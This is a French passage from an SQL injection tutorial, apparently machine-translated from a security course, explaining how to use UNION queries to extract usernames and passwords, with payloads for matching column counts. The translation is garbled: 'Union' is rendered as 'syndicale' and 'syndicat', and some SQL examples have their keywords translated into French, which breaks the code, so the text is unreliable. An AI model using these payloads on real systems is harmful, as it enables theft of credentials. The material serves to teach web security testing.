Clause syndicale
============

* * * * *

Jusqu'à présent, nous n'avons manipulé la requête d'origine que pour subvertir la logique de l'application Web et contourner l'authentification, à l'aide de l'opérateur `OR` et des commentaires. Cependant, un autre type d'injection SQL consiste à injecter des requêtes SQL entières exécutées avec la requête d'origine. Cette section le démontrera en utilisant la clause MySQL `Union` pour faire `SQL Union Injection`.

* * * * *

syndicat
-----

Avant de commencer à en savoir plus sur Union Injection, nous devons d'abord en savoir plus sur la clause SQL Union. La clause [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) est utilisée pour combiner les résultats de plusieurs instructions `SELECT` . Cela signifie que grâce à une injection `UNION` , nous serons en mesure de `SELECT` et de vider les données de tout le SGBD, à partir de plusieurs tables et bases de données. Essayons d'utiliser l'opérateur `UNION` dans un exemple de base de données. Voyons d'abord le contenu de la table `ports` :

```
mysql> SELECT * FROM ports ;

+----------+-----------+
| code | ville |
+----------+-----------+
| CN SHA | Shangai |
| SG SIN | Singapour |
| ZZ-21 | Shenzhen |
+----------+-----------+
3 rangées en série (0.00 sec)

```

Voyons ensuite le résultat des tables `ships` :

```
mysql> SELECT * FROM navires ;

+----------+-----------+
| Navire | ville |
+----------+-----------+
| Morisson | New-York |
+----------+-----------+
1 rangées dans l'ensemble (0,00 sec)

```

Essayons maintenant d'utiliser `UNION` pour combiner les deux résultats :

```
mysql> SELECT * FROM ports UNION SELECT * FROM navires ;

+----------+-----------+
| code | ville |
+----------+-----------+
| CN SHA | Shangai |
| SG SIN | Singapour |
| Morisson | New-York |
| ZZ-21 | Shenzhen |
+----------+-----------+
4 rangées en série (0.00 sec)

```

Comme nous pouvons le voir, `UNION` a combiné la sortie des deux instructions `SELECT` en une seule, de sorte que les entrées de la table `ports` et de la table `ships` ont été combinées en une seule sortie avec quatre lignes. Comme nous pouvons le voir, certaines lignes appartiennent à la table `ports` tandis que d'autres appartiennent à la table `ships` .

Remarque : Les types de données des colonnes sélectionnées sur toutes les positions doivent être les mêmes.

* * * * *

Colonnes paires
------------

Une instruction `UNION` ne peut fonctionner que sur des instructions `SELECT` avec un nombre égal de colonnes. Par exemple, si nous essayons `UNION` deux requêtes dont les résultats contiennent un nombre différent de colonnes, nous obtenons l'erreur suivante :

```
mysql> SELECT ville FROM ports UNION SELECT * FROM navires;

ERREUR 1222 (21000) : Les instructions SELECT utilisées ont un nombre différent de colonnes

```

La requête ci-dessus génère une erreur, car la première `SELECT` renvoie une colonne et la seconde `SELECT` en renvoie deux. Une fois que nous avons deux requêtes qui renvoient le même nombre de colonnes, nous pouvons utiliser l'opérateur `UNION` pour extraire des données d'autres tables et bases de données.

Par exemple, si la requête est :

Code : sql

```
SELECT * FROM produits WHERE product_id = 'user_input'

```

Nous pouvons injecter une requête `UNION` dans l'entrée, de sorte que les lignes d'une autre table soient renvoyées :

Code : sql

```
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '

```

La requête ci-dessus renvoie les entrées `username` et `password` de la table `passwords` , en supposant que la table `products` comporte deux colonnes.

* * * * *

Colonnes inégales
---------------

Nous découvrirons que la requête d'origine n'aura généralement pas le même nombre de colonnes que la requête SQL que nous voulons exécuter, nous devrons donc contourner cela. Par exemple, supposons que nous n'ayons qu'une seule colonne. Dans ce cas, nous voulons `SELECT`, nous pouvons mettre des données inutiles pour les colonnes requises restantes afin que le nombre total de colonnes avec lesquelles nous sommes `UNION`ing reste le même que la requête d'origine.

Par exemple, nous pouvons utiliser n'importe quelle chaîne comme données indésirables, et la requête renverra la chaîne comme sortie pour cette colonne. Si nous `UNION` avec la chaîne `"junk"`, la requête `SELECT` serait `SELECT "junk" from passwords`, qui renverra toujours `junk`. Nous pouvons aussi utiliser des nombres. Par exemple, la requête `SELECT 1 from passwords` renverra toujours `1` comme résultat.

Remarque : Lorsque vous remplissez d'autres colonnes avec des données indésirables, nous devons nous assurer que le type de données correspond au type de données des colonnes, sinon la requête renverra une erreur. Par souci de simplicité, nous utiliserons des nombres comme données indésirables, ce qui deviendra également utile pour suivre nos positions de charges utiles, comme nous le verrons plus tard.

Conseil : pour une injection SQL avancée, nous pouvons simplement utiliser 'NULL' pour remplir d'autres colonnes, car 'NULL' convient à tous les types de données.

La table `products` comporte deux colonnes dans l'exemple ci-dessus, nous devons donc `UNION` avec deux colonnes. Si nous ne voulions obtenir qu'une seule colonne 'par ex. `username`', nous devons faire `username, 2`, de sorte que nous ayons le même nombre de colonnes :

Code : sql

```
SELECT * parmi les produits où product_id = '1' UNION SELECT nom d'utilisateur, 2 parmi les mots de passe

```

Si nous avions plus de colonnes dans la table de la requête d'origine, nous devons ajouter plus de nombres pour créer les colonnes requises restantes. Par exemple, si l'orequête originale utilisée `SELECT` sur une table à quatre colonnes, notre injection `UNION` serait :

Code : sql

```
UNION SELECT nom d'utilisateur, 2, 3, 4 parmi les mots de passe-- '

```

Cette requête renverrait :

```
mysql> SELECT * des produits où product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| produit_1 | produit_2 | produit_3 | produit_4 |
+-----------+-----------+-----------+-----------+
| administrateur | 2 | 3 | 4 |
+-----------+-----------+-----------+-----------+

```

Comme nous pouvons le voir, notre sortie recherchée de la requête '`UNION SELECT username from passwords`' se trouve dans la première colonne de la deuxième ligne, tandis que les nombres remplissent les colonnes restantes.